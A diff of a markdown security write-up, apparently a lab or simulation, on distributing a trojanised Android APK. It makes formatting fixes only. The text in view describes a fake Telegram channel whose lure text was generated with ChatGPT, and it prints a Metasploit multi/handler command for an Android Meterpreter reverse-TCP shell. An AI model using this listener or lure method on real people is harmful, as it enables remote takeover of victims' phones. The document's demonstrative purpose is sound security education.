@@ -124,7 +124,8 @@ Note: In a real attack scenario, attackers might use stolen certificates or crea
 
 #### Distribution Vector
 
-**The modified APK was distributed through a simulated social engineering campaign using a Telegram channel. **
+**The modified APK was distributed through a simulated social engineering campaign using a Telegram channel.**
+
 I easily generated a fake description using ChatGPT and download an image from the official website
 
 ![Fake tlegram channel](telegram.png)
@@ -157,13 +158,13 @@ Upon approval, the malicious payload becomes active
 
 ### 7. Attack Infrastructure and Remote Access
 
-Metasploit Handler Configuration
+#### Metasploit Handler Configuration
 
 **The attack infrastructure utilizes Metasploit's multi/handler module to receive incoming connections:**
 
 ```msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444"```
 
-Connection Establishment
+#### Connection Establishment
 
 **Once the victim launches the infected application:**
 
